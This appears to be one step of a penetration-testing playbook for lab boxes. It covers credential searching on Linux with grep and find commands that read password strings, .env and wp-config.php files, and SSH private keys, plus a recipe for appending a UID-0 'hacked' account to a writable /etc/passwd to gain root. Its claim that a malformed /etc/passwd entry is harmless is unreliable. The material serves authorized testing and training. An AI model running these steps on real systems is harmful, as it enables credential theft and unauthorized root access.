# Linux - Credential Search

**Step 17 of 50 · Linux**

*Search application and user files for passwords, hashes, and reusable connection details.*

## Run this

```bash
grep -rniE 'password|passwd|pwd|secret' /var/www /opt /home 2>/dev/null
find /var/www /opt /home -name '.env' -o -name 'wp-config.php' 2>/dev/null
```

## Example output

```

/var/www/app/.env:DB_PASSWORD=REDACTED
/opt/app/config.php:password = REDACTED
...
```
Also check:

```bash
# Writable /etc/passwd — can add a root-equivalent account
ls -la /etc/passwd
openssl passwd -1 password123   # generate a password hash

# SSH keys in user home directories
find /home /root -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null
```

## What did you get?

- [ ] A cleartext credential is found → **Validate it on SSH or the application**
- [ ] A hash is found → **Go to Step 18 · [[Linux - Database Access]] or crack it offline**
- [ ] A database configuration is found → **Go to Step 18 · [[Linux - Database Access]]**
- [ ] `/etc/passwd` is world-writable → **Generate a hash with `openssl passwd -1`, append `hacked:$hash:0:0:root:/root:/bin/bash` to `/etc/passwd`, then `su hacked`**
- [ ] An SSH private key is found → **Copy it, `chmod 600`, and `ssh -i keyfile user@$BoxIP`**
- [ ] Nothing useful is found → **Go to Step 19 · [[Linux - Kernel Exploit]]**

## Notes

Inspect config files without printing private values into the transcript.

## Gotcha

> [!warning] 💡
> Search output can contain credentials. Save it to private loot and redact screenshots.

> [!warning] 💡
> A writable `/etc/passwd` is unusual but decisive. Confirm it is world-writable (`-rw-rw-rw-`) before attempting the edit. If you write a malformed entry the file is still valid — only the new entry is broken, not the original accounts.
